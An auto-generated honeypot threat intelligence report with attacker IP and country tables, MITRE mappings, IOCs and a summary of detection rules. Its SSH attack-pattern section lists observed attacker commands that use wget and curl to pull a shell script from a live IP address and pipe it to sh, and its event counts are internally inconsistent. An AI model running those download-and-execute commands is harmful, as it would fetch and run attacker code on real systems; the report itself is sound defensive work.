# Threat Intelligence Report

**Generated**: 2026-04-07 09:36 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **1 events** from **519 unique source IPs** across **31 countries** and **40 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 1 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 519 |
| Atomic Attack Patterns | 5 |
| MITRE ATT&CK Techniques | 3 |
| Generated Sigma Rules | 1 |
| Generated YARA Rules | 1 |
| Generated Suricata Rules | 0 |
| Blocked IPs (Firewall) | 416 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1105 (Ingress Tool Transfer) | | 2 |
| T1082 (System Information Discovery) | | 1 |
| T1059.004 (Unix Shell) | | 1 |

### Tactics Distribution

- **command_and_control**: 2 events █
- **discovery**: 1 events 
- **execution**: 1 events 

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 4,684 |
| Bulgaria | 1,121 |
| Germany | 453 |
| France | 448 |
| United Kingdom | 271 |
| The Netherlands | 229 |
| Russia | 175 |
| China | 150 |
| Portugal | 147 |
| Pakistan | 122 |
| Singapore | 112 |
| Hong Kong | 96 |
| Belgium | 77 |
| Japan | 77 |
| Canada | 70 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| DigitalOcean, LLC | 2,228 |
| ColocaTel Inc. | 1,088 |
| Google LLC | 736 |
| Amazon.com, Inc. | 565 |
| Alibaba US Technology Co., Ltd. | 425 |
| Modat B.V. | 369 |
| Vpsvault.host Ltd | 349 |
| Censys, Inc. | 338 |
| Hurricane Electric LLC | 217 |
| Tube-Hosting | 216 |
| Microsoft Corporation | 181 |
| UCLOUD INFORMATION TECHNOLOGY HK LIMITED | 172 |
| ONYPHE SAS | 122 |
| Zenlayer Inc | 100 |
| Detai Prosperous Technologies Limited | 91 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `157.230.235.42` | 1,260 | Attacker |
| `85.11.167.11` | 1,044 | Attacker |
| `165.245.172.231` | 745 | Attacker |
| `185.91.127.85` | 216 | Attacker |
| `45.205.1.110` | 182 | Attacker |
| `45.205.1.5` | 125 | Attacker |
| `165.245.163.7` | 75 | Attacker |
| `34.62.39.11` | 71 | Attacker |
| `3.132.26.232` | 70 | Attacker |
| `18.116.101.220` | 67 | Attacker |
| `3.131.220.121` | 67 | Attacker |
| `16.58.56.214` | 63 | Attacker |
| `92.110.87.38` | 63 | Attacker |
| `18.218.118.203` | 60 | Attacker |
| `3.130.168.2` | 57 | Attacker |
| `139.135.40.201` | 50 | Attacker |
| `182.119.63.172` | 50 | Attacker |
| `81.29.142.100` | 50 | Attacker |
| `110.37.28.119` | 46 | Attacker |
| `176.65.139.105` | 40 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 519 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 0 |

### Extracted URLs

- `https://46.151.182.82/sh`

---

## Top Attack Patterns (SSH)

- [1x] `uname -a`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://46.151.182.82/sh`
- [1x] `curl -sk https://46.151.182.82/sh`
- [1x] `sh -s ssh`

## Top Attack Patterns (HTTP)

| URI | Hits | Category |
|-----|------|----------|
| `/favicon.ico` | 2 | Web Scan |

### HTTP Methods

- **GET**: 56
- **PROPFIND**: 9

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 1 | `sigma/*.yml` |
| YARA (Payload) | 1 | `yara/*.yar` |
| Suricata (IDS/IPS) | 0 | `suricata/honeypot.rules` |
| Firewall (iptables) | 416 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*